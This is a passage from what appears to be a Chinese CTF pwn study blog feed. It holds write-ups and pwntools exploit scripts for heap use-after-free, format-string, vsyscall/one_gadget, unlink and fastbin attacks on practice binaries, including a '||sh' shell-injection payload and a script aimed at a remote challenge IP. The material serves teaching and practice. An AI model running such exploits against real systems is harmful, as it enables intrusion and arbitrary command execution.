LibcSearcher(&#39;free&#39;,free_addr)libc_base = free_addr - libc.dump(&#39;free&#39;)system_addr = libc_base + libc.dump(&#39;system&#39;)update_desc(1, 0x4, p32(system_addr))delete_user(2)p.interactive()</code></pre><hr><p>##hacknote</p><p>一共就三个功能</p><pre><code>int sub_8048956()&#123;  puts(&quot;----------------------&quot;);  puts(&quot;       HackNote       &quot;);  puts(&quot;----------------------&quot;);  puts(&quot; 1. Add note          &quot;);  puts(&quot; 2. Delete note       &quot;);  puts(&quot; 3. Print note        &quot;);  puts(&quot; 4. Exit              &quot;);  puts(&quot;----------------------&quot;);  return printf(&quot;Your choice :&quot;);&#125;</code></pre><p>Add: </p><pre><code>  if ( dword_804A04C &lt;= 5 )  &#123;    for ( i = 0; i &lt;= 4; ++i )    &#123;      if ( !*(&amp;ptr + i) )      &#123;        *(&amp;ptr + i) = malloc(8u);        if ( !*(&amp;ptr + i) )        &#123;          puts(&quot;Alloca Error&quot;);          exit(-1);        &#125;        **(&amp;ptr + i) = puts_a1_4;        printf(&quot;Note size :&quot;);        read(0, buf, 8u);        size = atoi(buf);        v0 = *(&amp;ptr + i);        *(v0 + 4) = malloc(size);        if ( !*(*(&amp;ptr + i) + 1) )        &#123;          puts(&quot;Alloca Error&quot;);          exit(-1);        &#125;        printf(&quot;Content :&quot;);        read(0, *(*(&amp;ptr + i) + 1), size);        puts(&quot;Success !&quot;);        ++dword_804A04C;        return __readgsdword(0x14u) ^ v5;      &#125;    &#125;  &#125;  else  &#123;    puts(&quot;Full&quot;);  &#125;</code></pre><p>Del:  漏洞就在这里，虽然free了chunk，但是并没有将指针归0 .</p><pre><code>  printf(&quot;Index :&quot;);  read(0, buf, 4u);  index = atoi(buf);  if ( index &lt; 0 || index &gt;= dword_804A04C )  &#123;    puts(&quot;Out of bound!&quot;);    _exit(0);  &#125;  if ( *(&amp;ptr + index) )  &#123;    free(*(*(&amp;ptr + index) + 1));    free(*(&amp;ptr + index));    puts(&quot;Success&quot;);  &#125;</code></pre><p>Show:</p><pre><code>  printf(&quot;Index :&quot;);  read(0, buf, 4u);  v1 = atoi(buf);  if ( v1 &lt; 0 || v1 &gt;= dword_804A04C )  &#123;    puts(&quot;Out of bound!&quot;);    _exit(0);  &#125;  if ( *(&amp;ptr + v1) )    (**(&amp;ptr + v1))(*(&amp;ptr + v1));</code></pre><p><img src="https://i.loli.net/2021/08/10/9ivuNXx7W2aVShD.png"></p><p>chunk结构如图，malloc一个8字节chunk,在该chunk的首地址存储puts函数，并且它将会打印下一个chunk中的内容。</p><p>所以我们的思路就是，malloc两个该结构，并将其都free掉。然后再malloc一个同样为8字节的chunk.</p><p>由于之前free掉了数组中两个8字节的chunk，所以我们会直接取出这两个free_chunk,从而构成 了UAF漏洞。</p><p>我们只需要把puts_a1+4修改为system，把malloc_note修改为”/bin/sh\x00”然后在执行show函数，则可以get_shell</p><p>至于泄露地址，则可以通过show函数。直接向任意的note中写入一个函数地址，然后再show即可.</p><p>exp如下</p><pre><code>#! /usr/bin/python3#coding:utf8  from pwn import *  from LibcSearcher import *  #sh = process(&#39;./hacknote&#39;)  sh = remote(&#39;111.200.241.244&#39;,59975)#sh = process(&#39;./hacknote&#39;)  elf = ELF(&#39;./hacknote&#39;)  puts_got = elf.got[&#39;puts&#39;]  puts_plt = elf.plt[&#39;puts&#39;]  show_addr = 0x804862B  def create(size,content):     sh.sendlineafter(&#39;Your choice :&#39;,&#39;1&#39;)     sh.sendlineafter(&#39;Note size :&#39;,str(size))     sh.sendafter(&#39;Content :&#39;,content)  def delete(index):     sh.sendlineafter(&#39;Your choice :&#39;,&#39;2&#39;)     sh.sendlineafter(&#39;Index :&#39;,str(index))  def show(index):     sh.sendlineafter(&#39;Your choice :&#39;,&#39;3&#39;)     sh.sendlineafter(&#39;Index :&#39;,str(index))  #创建二个堆  create(0x20,&#39;a&#39;*0x20)  create(0x20,&#39;b&#39;*0x20)  delete(0)  delete(1)  payload = p32(0x804862B) + p32(puts_got)  #这个8字节空间正好分配到了note0的结构体处  create(0x8,payload)  #泄露puts的加载地址  show(0)  #获得puts的加载地址  puts_addr = u32(sh.recv(4))  #libc = LibcSearcher(&#39;puts&#39;,puts_addr)  #print hex(puts_addr)  #libc_base = puts_addr - libc.dump(&#39;puts&#39;)  #print &#39;libc base:&#39;,hex(libc_base)  #system_addr = libc_base + libc.dump(&#39;system&#39;)  #binsh_addr = libc_base + libc.dump(&#39;str_bin_sh&#39;) libc = ELF(&#39;libc_32.so.6&#39;) libc_base = puts_addr - libc.sym[&#39;puts&#39;] print (&#39;libc base:&#39;,hex(libc_base)) system_addr = libc_base + libc.sym[&#39;system&#39;] binsh_addr = libc_base + libc.search(b&#39;/bin/sh&#39;).__next__()delete(2)  payload = p32(system_addr) + b&#39;||sh\x00&#39;  create(0x8,payload)  # get shell  show(0)  sh.interactive() </code></pre><p>这个||sh是shell注入，因为按照原来的show的逻辑,是这样的</p><pre><code>system(note[i]);   </code></pre><p>而note[i]是一个结构体，前四字节是system的地址，接下来是||sh字符串，所以，传给system的字符串实际上时xxxx||sh，这是一种或表达式，相当于注入一样（||或操作）</p><p>##1000levevls</p><p>main函数如下</p><pre><code>__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123;  int v3; // eax  __int64 v4; // rdx  __int64 v5; // rcx  sub_DDC();  logo();  while ( 1 )  &#123;    while ( 1 )    &#123;      menu();      v3 = str_to_l();      if ( v3 != 2 )        break;      Hint(a1, a2, v4, v5);    &#125;    if ( v3 == 3 )      break;    if ( v3 == 1 )    &#123;      go(a1, a2, v4, v5);    &#125;    else    &#123;      a1 = &quot;Wrong input&quot;;      puts(&quot;Wrong input&quot;);    &#125;  &#125;  puts_(a1, a2, v4, v5);  return 0LL;&#125;</code></pre><p>查看Hint函数</p><pre><code>int hint()&#123;  char v1[264]; // [rsp+8h] [rbp-108h] BYREF  if ( unk_20208C )    sprintf(v1, &quot;Hint: %p\n&quot;, &amp;system);  else    strcpy(v1, &quot;NO PWN NO FUN&quot;);  return puts(v1);&#125;.text:0000000000000D0A                 sub     rsp, 110h.text:0000000000000D11                 mov     rax, cs:system_ptr.text:0000000000000D18                 mov     [rbp+var_110], rax.text:0000000000000D1F                 lea     rax, unk_20208C</code></pre><p>发现这里把system的地址存放到了[rbp+var_110]</p><pre><code>int go()&#123;  __int64 v1; // [rsp+0h] [rbp-120h]  int v2; // [rsp+8h] [rbp-118h]  int v3; // [rsp+Ch] [rbp-114h]  __int64 v4; // [rsp+10h] [rbp-110h]  __int64 v5; // [rsp+10h] [rbp-110h]  __int64 v6; // [rsp+18h] [rbp-108h]  char v7[256]; // [rsp+20h] [rbp-100h] BYREF  puts(&quot;How many levels?&quot;);  v1 = str_to_l();  if ( v1 &gt; 0 )    v4 = v1;  else    puts(&quot;Coward&quot;);  puts(&quot;Any more?&quot;);  v5 = v4 + str_to_l();  if ( v5 &gt; 0 )  &#123;    if ( v5 &lt;= 99 )    &#123;      v6 = v5;    &#125;    else    &#123;      puts(&quot;You are being a real man.&quot;);      v6 = 100LL;    &#125;    puts(&quot;Let&#39;s go!&#39;&quot;);    v2 = time(0LL);    if ( the_game(v6) )    &#123;      v3 = time(0LL);      sprintf(v7, &quot;Great job! You finished %d levels in %d seconds\n&quot;, v6, (v3 - v2));      puts(v7);    &#125;    else    &#123;      puts(&quot;You failed.&quot;);    &#125;    exit(0);  &#125;  return puts(&quot;Coward Coward Coward Coward Coward&quot;);&#125;</code></pre><p>而在go函数中__int64 v4; // [rsp+10h] [rbp-110h]<br>并且go和hint由同一个函数调用，所以他们用于同样的rbp, 也就是说system的地址残留在了v4中</p><pre><code>  if ( v1 &gt; 0 )    v4 = v1;</code></pre><p>发现如果v1&lt;0那么v4不会被清0 ， 所以我们输入v1=0 。然后在输入one_gadget-system ，这样v5就存储了one_gadget的地址了</p><pre><code>v5 = v4 + str_to_l();</code></pre><p>因为go函数调用了game函数，所以game函数的栈开辟在go的上方。</p><pre><code>07:0038│     0x7ffdf3653e60 ◂— 0x11400000000pwndbg&gt; 08:0040│     0x7ffdf3653e68 ◂— 0xc0000001709:0048│ rbp 0x7ffdf3653e70 —▸ 0x7ffdf3653fa0 —▸ 0x7ffdf3653fe0 —▸ 0x55ca23ab7fd0 ◂— push   r150a:0050│     0x7ffdf3653e78 —▸ 0x55ca23ab7c8a ◂— test   eax, eax0b:0058│     0x7ffdf3653e80 ◂— 0xfffffffffffffeda0c:0060│     0x7ffdf3653e88 ◂— 0x55ca6141b4cb0d:0068│     0x7ffdf3653e90 —▸ 0x7f6dff55427a (do_system+1098) ◂— mov    rax, qword ptr [rip + 0x37ec37]</code></pre><p>我们需要在rbp+4后的位置上一直pop_ret直到执行one_gadget为止。</p><p>然而，pop在这里也用不了，因为是随机地址，我们找不到。</p><p>然而，有一个例外的东西，它的地址是固定的。那就是vsyscall</p><p>Vsyscall用于系统调用，它的地址固定在0xffffffffff600000-0xffffffffff601000，vsyscall在内核中实现，无法用docker模拟。因此某些虚拟机上可能不成功。</p><p>可以利用的vsyscall地址如下</p><pre><code>gettimeofday: 0xffffffffff600000</code></pre><p>这里我们可以把vsyscall函数当成ret的gadget，从而实现调用one_gadget</p><p>exp如下</p><pre><code>#! /usr/bin/python3from pwn import *io = process(&quot;./100levels&quot;)libc = ELF(&quot;./libc.so&quot;)one_gadget = 0x4526asystem = libc.sym[&#39;system&#39;]io.recvuntil(&quot;Choice:\n&quot;)io.send(&#39;2&#39;)io.recvuntil(&quot;Choice:\n&quot;)io.sendline(&#39;1&#39;)io.recvuntil(&quot;How many levels?\n&quot;)io.send(&#39;0&#39;)io.recvuntil(&quot;Any more?\n&quot;)io.send(str(one_gadget-system))def cacu ():   io.recvuntil(&quot;Question: &quot;)   num1 = int(io.recvuntil(&quot; &quot;))   print(&quot;num1 = &quot;+str(num1))   io.recvuntil(&quot;* &quot;)   num2 = int(io.recvuntil(&quot; &quot;))   print(&quot;num2 = &quot;+str(num2))   ans = num1 * num2   print (io.recvuntil(&quot;Answer:&quot;))   io.sendline(str(ans))   print(&quot;ans = &quot;+str(ans))for i in range(99):   cacu()gdb.attach(io)print (io.recvuntil(&quot;Answer:&quot;))payload = b&#39;a&#39;*0x38 + p64(0xffffffffff600000)*3io.send(payload)io.interactive()</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;#pwn进阶区&lt;/p&gt;
&lt;p&gt;##greeting-150&lt;/p&gt;
&lt;p&gt;这是个明显的字符串漏洞&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;return printf(s);&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;思路就是修改strlen函数为system，并且让函数循环执行，从而getsh</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>缓冲区溢出-CTF-PWN</title>
    <link href="http://example.com/2021/01/30/PWN%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2021/01/30/PWN%E5%AD%A6%E4%B9%A0/</id>
    <published>2021-01-30T01:48:45.145Z</published>
    <updated>2021-11-18T16:55:10.642Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://i.loli.net/2021/03/30/4Ycae86bfKsDMCE.gif"></p><p>一字节等于8位或者说8比特</p><p>2字节==16位</p><p>1字长32位PC的字长是32bit，现在开始成为主流的64位CPU字长是64bit，手机上使用较多的ARM处理器大多数是32位</p><h1 id="常用寄存器"><a href="#常用寄存器" class="headerlink" title="常用寄存器"></a>常用寄存器</h1><p>和8086稍有区别，具体如下</p><p><img src="https://i.loli.net/2021/01/30/KJpQyoDv7jRdxeV.gif"></p><h1 id="常用指令"><a href="#常用指令" class="headerlink" title="常用指令"></a>常用指令</h1><p><img src="https://i.loli.net/2021/01/30/SG5b6xYvB7mhKJt.gif"></p><p>调试</p><pre><code>context.log_level=&#39;debug&#39;gdb.attach(io)io.send(p)gdb.attach(p,&#39;b *0x8048600&#39;)利用gdb动调，在0x8048600处下了个断点</code></pre><p>ROPgadget</p><pre><code>ROPgadget --binary ret2syscall --only &quot;pop|ret&quot;</code></pre><p>LibcSearcher</p><pre><code>libc = LibcSearcher(&quot;gets&quot;,gets_real_addr)libcbase = gets_real_addr – obj.dump(&quot;fgets&quot;)system_addr = libcbase + obj.dump(&quot;system&quot;)            #system 偏移bin_sh_addr = libcbase + obj.dump(&quot;str_bin_sh&quot;)         #/bin/sh 偏移</code></pre><p>关闭所以防护编译</p><pre><code>gcc tar.c -z execstack -fno-stack-protector -no-pie -z norelro -o tar-fPIC</code></pre><p>生成shellcode</p><pre><code>shellcode = asm(shellcraft.sh())</code></pre><p>linux自带工具（搜索函数）：</p><pre><code>cd xxxstrings xxx</code></pre><p>输出xxx文件中所有可打印字符<br>    strings -t x libc-2.19.so | grep /bin/sh</p><pre><code>strings xxx | grep /bin/sh</code></pre><p>若有则打印bin/sh字符<br>查看内存</p><pre><code>vmmap </code></pre><p>查看xxx使用的libc路径及其版本</p><pre><code>ldd xxx</code></pre><p>查看栈中内容    </p><pre><code>stack 300</code></pre><p>查看寄存器</p><pre><code>p /x $rbp</code></pre><p>更改换行符</p><pre><code>dos2unix myexp.py</code></pre><p>查看栈值</p><pre><code>x /40gx $rsp40代表是显示数目g代表是8bit显示，x以16进制显示第一个x代表查看内存</code></pre><blockquote><p>libc_base = int(io.recvuntil(b”\n”,dorp = true),16) - libc.symbols[“puts”]</p></blockquote><blockquote><blockquote><p>int ： 将收到的 16 进制字符串转换成整数<br>dorp = true 是否丢弃掉\n字符，（是）</p></blockquote></blockquote><blockquote><p>cyclic(60)</p></blockquote><blockquote><blockquote><p>生产60字节的垃圾数据</p></blockquote></blockquote><blockquote><p>shellcode = asm(shellcraft.sh())</p></blockquote><blockquote><blockquote><p>生成shellcode</p></blockquote></blockquote><blockquote><p>格式化字符串的任意地址值的修改</p></blockquote><blockquote><p>payload = fmtstr_payload(12,{0x804a048:0x02223322})<br>fmtstr_payload(offset,{addr:number})</p></blockquote><h1 id="DynELF模块的使用"><a href="#DynELF模块的使用" class="headerlink" title="DynELF模块的使用"></a>DynELF模块的使用</h1><pre><code>def leak(address):    payload=&#39;A&#39;*junk+p32(write_plt)+p32(func_addr)+p32(1)+p32(address)+p32(4)    #junk是溢出需要的字节，利用pwndbg中的cyclic可以计算出    #write(1,address,4)表示将address向外写    r.send(payload)    data = r.recv(4)    print(data)    return datadyn=DynELF(leak,elf=ELF(&#39;./pwn200&#39;))#调用DynELFsys_addr = dyn.lookup(&#39;system&#39;,libc)print(&#39;system address:&#39;,hex(sys_addr))</code></pre><h1 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h1><p>系统调用（x86）<br>    mov eax , 0xb            #系统调用号<br>    mov ebx , [“/bin/sh”]<br>    mov ecx , 0                #参数<br>    mov edx , 0<br>    int 0x80                #中断号</p><p>=&gt; execve(“/bin/sh”,NULL,NULL)</p><p>ROPgadget –binary ret2syscall –only “pop|ret”</p><p>ret  就是pop eip ; esp-2   #b站大学 p3 150 左右</p><p>小端序  与  大端序</p><p>小端序 ： </p><p><img src="https://i.loli.net/2021/03/24/HE4yxZKq7pYGi6V.gif"></p><p>重要寄存器功能：</p><p>RIP<br>*存放当前指令的地址</p><p>RSP<br>*存放当前栈帧的栈顶地址</p><p>RBP<br>*存放当前栈帧的栈底地址</p><p>RAX<br>*同用寄，存放函数存器返回值</p><p>#报错</p><p>##UnicodeDecodeError: ‘ascii’ codec can’t decode byte 0xe6 in position 36: ordinal not</p><p>UnicodeDecodeError: ‘ascii’ codec can’t decode byte 0xe6 in position 36: ordinal not in range(128)</p><p>原因是：python的str默认是ascii编码，和unicode编码冲突，就会报这个标题错误</p><p>解决的办法是，在开头添加如下代码：</p><pre><code>import sysreload(sys)sys.setdefaultencoding(&#39;utf8&#39;)</code></pre><h1 id="Ret2libc"><a href="#Ret2libc" class="headerlink" title="Ret2libc"></a>Ret2libc</h1><p><img src="https://i.loli.net/2021/03/24/6aJWjcAIN5Mteu2.gif"></p><p>system_elf = elf.plt[“system”]</p><p>linux自带工具（搜索函数）：</p><p>cd xxx<br>strings xxx</p><p>输出xxx文件中所有可打印字符</p><p>string xxx | grep /bin/sh</p><p>若有则打印bin/sh字符</p><p>如下图，连续调用函数时栈 的结构</p><p><img src="https://i.loli.net/2021/03/24/3E9uhZ6bokyN1We.gif"></p><p>system 执行时找到上两个字作为参数（bin/sh）<br>然后pop bin/sh ， return</p><p>在执行puts函数，上两字寻找参数“hello world”<br>然后pop_ret</p><p>最后执行exit 函数，同上</p><p>libc.symbols[“system”] - libc.symblos[“puts”]</p><p>sendlineafter(b”:”,str(elf.got[“puts”]))</p><p>sh.recv(numb = 2048, timeout = dufault)  接受数据，numb指定接收的字节，timeout指定超时<br>sh.recvline(keepends=True)  接受一行数据，keepends为是否保留行尾的\n</p><p>接收到：后，将puts函数的got表地址以字符串形式发送</p><p>recvuntil（b”:”）</p><p>接收直到：</p><p>libc_base = int(io.recvuntil(b”\n”,dorp = true),16) - libc.symbols[“puts”]</p><p>int ： 将收到的 16 进制字符串转换成整数<br>dorp = true 是否丢弃掉\n字符，（是）</p><p>cyclic(60)</p><p>生产60字节的垃圾数据</p><p>shellcode = asm(shellcraft.sh())</p><p>生成shellcode</p><blockquote><blockquote><p>e = ELF(‘/bin/cat’)<br>print hex(e.address)  # 文件装载的基地址<br>0x400000</p></blockquote></blockquote><blockquote><blockquote><p>print hex(e.symbols[‘write’]) # 函数地址<br>0x401680</p></blockquote></blockquote><blockquote><blockquote><p>print hex(e.got[‘write’]) # GOT表的地址<br>0x60b070</p></blockquote></blockquote><blockquote><blockquote><p>print hex(e.plt[‘write’]) # PLT的地址<br>0x401680</p></blockquote></blockquote><blockquote><blockquote><p>print hex(e.search(‘/bin/sh’).next())# 字符串/bin/sh的地址</p></blockquote></blockquote><blockquote><blockquote><p>gdb.attach(sh) ———-v</p></blockquote></blockquote><blockquote><blockquote><p>sh.send(p)      ——–&gt;启动gdb调试</p></blockquote></blockquote><p>vmmap </p><pre><code>查看内存</code></pre><p>ldd xxx</p><pre><code>查看xxx使用的libc路径及其版本</code></pre><p>stack 300</p><pre><code>查看栈中内容</code></pre><h1 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h1><pre><code>pip install docker-composedocker-compose up -ddocker-compose build</code></pre><h1 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h1><blockquote><p>%100$p</p></blockquote><blockquote><p>$p</p><blockquote><p>打印栈中保存的内容</p></blockquote></blockquote><blockquote><p>%s</p><blockquote><p>将栈中数据解析为地址，打印地址所对应的数据</p></blockquote></blockquote><blockquote><p>%n</p><blockquote><p>写入前方打印成功的字符的个数</p></blockquote></blockquote><p>堆栈图入下</p><p><img src="https://i.loli.net/2021/03/30/ejlVFMdDOQTAPmo.gif"></p><h1 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h1><p>当申请的堆较小时，直接在data段申请一段空间。</p><p>当申请的堆较大时，则在mmap段申请一段空间</p><p>清除缓冲区</p><pre><code>setbuf(stdout,0)</code></pre><h3 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h3><p>是内存分配的基本单位</p><p>只会分配字长整数倍的chunk(会自动补齐)</p><p>int* p = malloc(0x100)  实际消耗0x110,因为需要两个控制字段。</p><p><img src="https://i.loli.net/2021/03/31/obmD7J9wpxkS8I1.gif"></p><h3 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc chunk"></a>malloc chunk</h3><p>size的后3 Bity存储控制信息</p><p>|A|M|P|</p><p>prev size 用于存储上一个free chunk大小</p><p>size  用于存储自身控制字段和数据字段大小</p><p>p = 0 表示为free chunk</p><p>p = 1 表示非free chunk</p><p>特殊的是 ， fast chunk的p总是为1 ， 并且不会合并。</p><p><img src="https://i.loli.net/2021/03/31/piN8YSfP9J634t1.gif"></p><h3 id="free-chunk-的合并"><a href="#free-chunk-的合并" class="headerlink" title="free chunk 的合并"></a>free chunk 的合并</h3><p>当下一个chunk发现上一个chunk也是free_chunk时，两个chunk将被合并，size变为两个chunk的总和</p><p>但是数据仍在原地，结构如图</p><p><img src="https://i.loli.net/2021/03/31/B4CGDpESHVWJMmT.gif"></p><p>当堆较小时，堆就在data和bss段的高地址</p><p><img src="https://i.loli.net/2021/03/31/RbFO3SiUqQynHCg.gif"></p><p>逻辑链表</p><blockquote><p>fasebins 按照堆的大小分配bin</p></blockquote><blockquote><p>而每个链表由指针链接形成链表</p></blockquote><blockquote><p>由fd指针指向下一个chunk</p></blockquote><p><img src="https://i.loli.net/2021/03/31/Uefvz8EP7TDpwal.gif"></p><p>###bin双向链表</p><blockquote><p>bin也是栈的结构</p><p>由fd指针指向下一个chunk</p><p>由bk指针指向上一个chunk</p><p>每个chunk相互链接形成双向链表</p></blockquote><p><img src="https://i.loli.net/2021/03/31/wEejkFsSzI6BYtU.gif"><br><img src="https://i.loli.net/2021/03/31/5lEriA7xubqcows.gif"></p><h2 id="double-free-漏洞"><a href="#double-free-漏洞" class="headerlink" title="double_free 漏洞"></a>double_free 漏洞</h2><pre><code>int* p = malloc(0x300) ;int* q = malloc(0x200) ;free(q);free(p);free(q);</code></pre><h1 id="可利用函数"><a href="#可利用函数" class="headerlink" title="可利用函数"></a>可利用函数</h1><p>##fmtstr_payload</p><pre><code>fmtstr_payload(offset, writes, numbwritten=0, write_size=&#39;byte&#39;)</code></pre><p>第一个参数表示格式化字符串的偏移；</p><p>第二个参数表示需要利用%n写入的数据，采用字典形式，我们要将printf的GOT数据改为system函数地址，就写成{printfGOT: systemAddress}</p><p>第三个参数表示已经输出的字符个数，若没有，为0，采用默认值即可；</p><p>第四个参数表示写入方式，是按字节（byte）、按双字节（short）还是按四字节（int），对应着hhn、hn和n，默认值是byte，即按hhn写。</p><p>fmtstr_payload函数返回的就是payload</p><p>##mprotect</p><pre><code>mprotect(void *addr, size_t len, int prot)</code></pre><p>利用vmmap命令在gdb中找到可以修改的段</p><p>int mprotect(void *addr, size_t len, int prot);</p><p>addr：修改保护属性区域的起始地址，addr必须是一个内存页的起始地址，简而言之为页大小（一般是 4KB == 4096字节）整数倍。</p><p>len：被修改保护属性区域的长度,最好为页大小整数倍。修改区域范围[addr, addr+len-1]。<br>prot：可以取以下几个值，并可以用“|”将几个属性结合起来使用：</p><p>1）PROT_READ：内存段可读；</p><p>2）PROT_WRITE：内存段可写；</p><p>3）PROT_EXEC：内存段可执行；</p><p>4）PROT_NONE：内存段不可访问。</p><p>返回值：0；成功，-1；失败（并且errno被设置）</p><p>1）EACCES：无法设置内存段的保护属性。当通过 mmap(2) 映射一个文件为只读权限时，接着使用 mprotect() 标志为 PROT_WRITE这种情况就会发生。</p><p>2）EINVAL：addr不是有效指针，或者不是系统页大小的倍数。</p><p>3）ENOMEM：内核内部的结构体无法分配。</p><h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h2><p>利用Unlink机制，向unsortedbin中写入chunk，从而达到攻击效果。这里以ctf-wiki 的例题作为理解。</p><hr><pre><code>context.terminal = [&#39;gnome-terminal&#39;, &#39;-x&#39;, &#39;sh&#39;, &#39;-c&#39;]if args[&#39;DEBUG&#39;]:    context.log_level = &#39;debug&#39;context.binary = &quot;./stkof&quot;stkof = ELF(&#39;./stkof&#39;)if args[&#39;REMOTE&#39;]:    p = remote(&#39;127.0.0.1&#39;, 7777)else:    p = process(&quot;./stkof&quot;)log.info(&#39;PID: &#39; + str(proc.pidof(p)[0]))libc = ELF(&#39;./libc.so.6&#39;)head = 0x602140def alloc(size):    p.sendline(&#39;1&#39;)    p.sendline(str(size))    p.recvuntil(&#39;OK\n&#39;)def edit(idx, size, content):    p.sendline(&#39;2&#39;)    p.sendline(str(idx))    p.sendline(str(size))    p.send(content)    p.recvuntil(&#39;OK\n&#39;)def free(idx):    p.sendline(&#39;3&#39;)    p.sendline(str(idx))def exp():# trigger to malloc buffer for io functionalloc(0x100)  # idx 1# beginalloc(0x30)  # idx 2# small chunk size in order to trigger unlinkalloc(0x80)  # idx 3# a fake chunk at global[2]=head+16 who&#39;s size is 0x20payload = p64(0)  #prev_sizepayload += p64(0x20)  #sizepayload += p64(head + 16 - 0x18)  #fdpayload += p64(head + 16 - 0x10)  #bkpayload += p64(0x20)  # next chunk&#39;s prev_size bypass the checkpayload = payload.ljust(0x30, &#39;a&#39;)# overwrite global[3]&#39;s chunk&#39;s prev_size# make it believe that prev chunk is at global[2]payload += p64(0x30)# make it believe that prev chunk is freepayload += p64(0x90)edit(2, len(payload), payload)# unlink fake chunk, so global[2] =&amp;(global[2])-0x18=head-8free(3)p.recvuntil(&#39;OK\n&#39;)# overwrite global[0] = free@got, global[1]=puts@got, global[2]=atoi@gotpayload = &#39;a&#39; * 8 + p64(stkof.got[&#39;free&#39;]) + p64(stkof.got[&#39;puts&#39;]) + p64(    stkof.got[&#39;atoi&#39;])edit(2, len(payload), payload)# edit free@got to puts@pltpayload = p64(stkof.plt[&#39;puts&#39;])edit(0, len(payload), payload)# free global[1] to leak puts addrfree(1)puts_addr = p.recvuntil(&#39;\nOK\n&#39;, drop=True).ljust(8, &#39;\x00&#39;)puts_addr = u64(puts_addr)log.success(&#39;puts addr: &#39; + hex(puts_addr))libc_base = puts_addr - libc.symbols[&#39;puts&#39;]binsh_addr = libc_base + next(libc.search(&#39;/bin/sh&#39;))system_addr = libc_base + libc.symbols[&#39;system&#39;]log.success(&#39;libc base: &#39; + hex(libc_base))log.success(&#39;/bin/sh addr: &#39; + hex(binsh_addr))log.success(&#39;system addr: &#39; + hex(system_addr))# modify atoi@got to system addrpayload = p64(system_addr)edit(2, len(payload), payload)p.send(p64(binsh_addr))p.interactive()if __name__ == &quot;__main__&quot;:    exp()</code></pre><hr><p>首先构造堆如图所示</p><p><img src="https://i.loli.net/2021/05/10/3Vi6RJ9yWMC4SEm.jpg"></p><p>那么在unsortedbin中则会出现0x6002270-0x18 的chunk，我们通过修改一些chunk为函数来实现其调用。</p><pre><code>payload = &#39;a&#39; * 8 + p64(stkof.got[&#39;free&#39;]) + p64(stkof.got[&#39;puts&#39;]) + p64(stkof.got[&#39;atoi&#39;])edit(2, len(payload), payload)</code></pre><p>例如上一句，向bin中写入了各个函数地址作为chunk地址。</p><p><img src="https://i.loli.net/2021/05/11/s2kbStcz71L9TfQ.gif"></p><pre><code>payload = p64(stkof.plt[&#39;puts&#39;])edit(0, len(payload), payload)</code></pre><p>接着，覆盖free的地址为puts，实现泄露。</p><p>如法炮制，实现system函数的调用。</p><blockquote><blockquote><p>也可以将free改为system，在chunk[3]中写入”bin/sh\0x00”,最后free(3)也可以实现getshell</p></blockquote></blockquote><h1 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin_attack"></a>fastbin_attack</h1><p>fastbin_attach 其基础攻击手段如下：</p><blockquote><blockquote><p><strong>double_free</strong></p></blockquote><p>1.fastbin 的堆块被释放后 next_chunk 的 pre_inuse 位不会被清空</p><p>2.fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。</p></blockquote><p>我们可以构造如下的结构来实现任意地址写的功能</p><p><img src="https://i.loli.net/2021/05/16/GaKyohANWqgInHJ.gif"></p><blockquote><blockquote><p><strong>House of Spirit</strong></p></blockquote><p>该技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配指定地址的 chunk 的目的。</p></blockquote><p>但是想要成功链接fack_chunk需要如下条件</p><p>fack_chunk 的ISMMAP位不能为1，因为free时mmap的chunk，会单独处理</p><p>fack_chunk 的地址需要对齐，MALLOC_ALIGN_MASK</p><p>fack_chunk 的size大小需要满足相应fastbin，同时也应对齐</p><p>fack_chunk 的next_chunk大小不可越界。即不能小于 2 * SIZE_SZ，同时也不能大于av-&gt;system_mem</p><p>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况</p><blockquote><blockquote><p>Alloc to Stack  &amp;&amp;  Arbitrary Alloc</p></blockquote><p>分别是将堆分配到栈，或者是任意地址</p></blockquote><blockquote><p>alloc to stack 可以覆盖栈的返回地址来劫持执行流</p><p>arbirtary alloc 可以使用字节错位来实现直接分配 fastbin 到_malloc_hook 的位置，相当于覆盖_malloc_hook 来控制程序流程。（这个我暂时也不懂）</p></blockquote><p>下面就用一道题来实际演示下</p><p>2014 hack.lu oreo <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/fastbin-attack/2014_hack.lu_oreo">题目链接</a></p><p>1.利用堆溢出漏洞，泄露free_got 的地址（那么哪里才能买到呢？）</p><p>我们先free掉任意一个chunk，因为libc的延迟绑定机制，现在我们将free_got写入next_chunk中，然后 show 来泄露got表地址</p><p>2.因为 ++rifle_cnt 语句 会记录创建的chunk的个数，因此可以为攻击准备环境。</p><p>再向message写入payload，准备如下条件来绕过检测</p><pre><code>payload = b&#39;a&#39;*0x1c + b&#39;\x00&#39;*4 + b&#39;A&#39;*4 + p32(100)           #padding + last_chunk + pre_size + size</code></pre><p>现在我们实现了任意地址写入的功能</p><p>3.get_shell</p><p>我们修改某函数的got表指针为libc.symbols[‘system’]函数的地址，利用fget函数写入，并执行该函数，就可以get_shell。</p><p>exp如下<br>    #! /usr/bin/python3<br>    from pwn import *<br>    io = process(‘./oreo’)<br>    elf=ELF(‘./oreo’)<br>    context.log_level=’debug’<br>    libc = ELF(‘libc.so.6’)</p><pre><code>def add (name,des):    io.sendline(&#39;1&#39;)    #io.recvuntil(&#39;Rifle name: &#39;)    io.sendline(name)    #io.recvuntil(&#39;Rifle description: &#39;)    io.sendline(des)def show ():    io.sendline(&#39;2&#39;)def order ():    